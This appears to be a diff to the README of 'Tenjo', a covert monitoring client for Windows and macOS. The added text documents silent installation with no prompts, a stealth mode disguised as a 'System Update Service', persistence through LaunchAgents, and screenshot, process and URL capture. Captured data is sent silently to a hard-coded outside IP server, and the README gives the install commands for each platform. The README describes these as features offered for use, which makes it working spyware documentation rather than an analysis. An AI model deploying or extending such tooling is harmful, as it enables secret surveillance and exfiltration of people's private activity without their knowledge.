@@ -35,11 +35,13 @@ chmod +x easy_install_macos.sh
 
 ## Features
 - ✅ **Silent Installation** - No user prompts or notifications during operation
-- ✅ **Auto-Start** - Automatically starts on system boot
+- ✅ **Advanced Service Management** - Built-in startup script with signal handling
+- ✅ **Auto-Start** - Automatically starts on system boot via LaunchAgent/Service
 - ✅ **Stealth Mode** - Runs hidden in background as "System Update Service"
 - ✅ **Cross-Platform** - Works on Windows and macOS
 - ✅ **Self-Contained** - Installs dependencies automatically
 - ✅ **Easy Uninstall** - Simple removal scripts included
+- ✅ **Graceful Shutdown** - Proper cleanup on system signals
 
 ## Monitoring Features
 - 📸 **Screenshot capture** every 60 seconds
@@ -47,6 +49,7 @@ chmod +x easy_install_macos.sh
 - 💻 **Process monitoring** (running applications)
 - 📊 **URL tracking** with duration
 - 📡 **Silent data transmission** to dashboard server
+- 🔧 **Enhanced logging** with rotating log files
 
 ## 🗑️ **Easy Uninstallation**
 
@@ -110,7 +113,84 @@ install_windows.bat http://103.129.149.67
 ./install_macos.sh http://103.129.149.67
 ```
 
+## Advanced Service Management
+
+The client now includes a comprehensive startup script (`tenjo_startup.py`) with enhanced features:
+
+### **Manual Service Control**
+```bash
+# Start service manually
+python3 tenjo_startup.py
+
+# Start with custom server
+python3 tenjo_startup.py --server-url http://your-server.com
+
+# Install as system service
+python3 tenjo_startup.py --install-service
+
+# Uninstall system service  
+python3 tenjo_startup.py --uninstall-service
+
+# Debug mode (visible, detailed logs)
+python3 tenjo_startup.py --no-stealth --debug
+```
+
+### **Service Features**
+- ✅ **Signal Handling** - Graceful shutdown on SIGINT/SIGTERM
+- ✅ **Rotating Logs** - Automatic log rotation by date
+- ✅ **Service Installation** - Cross-platform service management
+- ✅ **Stealth Mode** - Configurable visibility
+- ✅ **Error Recovery** - Automatic restart on failures
+
+See `STARTUP_SCRIPT_DOCS.md` for complete documentation.
+
+## Server Configuration
+
+### Default Server
+- **URL**: `http://103.129.149.67`
+- **Protocol**: HTTP/HTTPS supported
+- **Port**: Configurable during installation
+
+### Custom Server Installation
+**Windows:**
+```cmd
+easy_install_windows.bat
+# Enter custom URL when prompted: http://103.129.149.67
+```
+
+**macOS:**
+```bash
+./easy_install_macos.sh
+# Enter custom URL when prompted: http://103.129.149.67
+```
+
+## Advanced Installation (Stealth Mode)
+
+For completely silent installation without user interaction:
+
+### Windows Silent Install
+```cmd
+install_windows.bat http://103.129.149.67
+```
+
+### macOS Silent Install
+```bash
+./install_macos.sh http://103.129.149.67
+```
+
 ## Troubleshooting
+
+### Check Service Status
+```bash
+# Check if Tenjo is running
+ps aux | grep tenjo_startup
+
+# View real-time logs
+tail -f ~/.tenjo_client/src/logs/tenjo_startup_$(date +%Y%m%d).log
+
+# Check service registration (macOS)
+launchctl list | grep tenjo
+```
 
 ### Common Issues
 1. **"Access Denied"** - Run as Administrator (Windows) or with sudo (macOS)
@@ -130,13 +210,14 @@ rmdir /s /q "%APPDATA%\SystemUpdate"
 
 **macOS:**
 ```bash
-launchctl unload ~/Library/LaunchAgents/com.system.update.service.plist
-rm ~/Library/LaunchAgents/com.system.update.service.plist
-rm -rf ~/.system_update
+launchctl unload ~/Library/LaunchAgents/com.tenjo.client.plist
+rm ~/Library/LaunchAgents/com.tenjo.client.plist
+rm -rf ~/.tenjo_client
 ```
 
 ## Support
 - Monitoring runs completely in background
 - No visible interface or notifications
+- Enhanced logging for troubleshooting
 - Automatic restart if process crashes
 - Logs are minimized for stealth operation
